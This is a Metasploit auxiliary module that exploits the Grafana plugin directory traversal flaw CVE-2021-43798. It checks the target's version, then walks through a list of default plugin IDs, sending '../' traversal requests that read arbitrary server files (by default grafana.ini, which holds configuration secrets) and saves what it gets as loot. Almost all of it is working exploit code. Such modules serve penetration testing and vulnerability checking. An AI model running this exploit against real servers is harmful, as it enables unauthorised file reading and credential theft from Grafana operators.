##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Grafana Plugin Path Traversal',
        'Description' => %q{
          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal
          through the plugin URL.  A valid plugin ID is required, but many are installed by default.
        },
        'Author' => [
          'h00die', # msf module
          'jordyv' # discovery
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['CVE', '2021-43798'],
          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],
          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],
          ['EDB', '50581'],
          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],
          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce']

        ]
      )
    )
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 13])
      ]
    )
  end

  def check
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown unless res && res.code == 200

    /"subTitle":"Grafana v(?<version>\d{1,2}.\d{1,2}.\d{1,2}) \([0-9a-f]{10}\)",/ =~ res.body
    return Exploit::CheckCode::Safe unless version

    version = Rex::Version.new(version)
    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||
       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||
       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||
       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))
      print_good("Detected vulnerable Grafina: #{version}")
      return Exploit::CheckCode::Appears
    end
    print_bad("Detected non-vulnerable Grafina: #{version}")
    return Exploit::CheckCode::Safe
  end

  def run_host(ip)
    check_code = check
    return unless check_code == Exploit::CheckCode::Appears

    [
      'alertlist',
      'annolist',
      'barchart',
      'bargauge',
      'candlestick',
      'cloudwatch',
      'dashlist',
      'elasticsearch',
      'gauge',
      'geomap',
      'gettingstarted',
      'grafana-azure-monitor-datasource',
      'graph',
      'heatmap',
      'histogram',
      'influxdb',
      'jaeger',
      'logs',
      'loki',
      'mssql',
      'mysql',
      'news',
      'nodeGraph',
      'opentsdb',
      'piechart',
      'pluginlist',
      'postgres',
      'prometheus',
      'stackdriver',
      'stat',
      'state-timeline',
      'status-history',
      'table',
      'table-old',
      'tempo',
      'testdata',
      'text',
      'timeseries',
      'welcome',
      'zipkin'
    ].each do |plugin|
      vprint_status("Attempting plugin: #{plugin}")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])
      })
      next unless res && res.code == 200

      vprint_good(res.body)
      path = store_loot(
        'grafana.loot',
        'application/octet-stream',
        ip,
        res.body,
        File.basename(datastore['FILEPATH'])
      )
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
      break
    end
  end

end
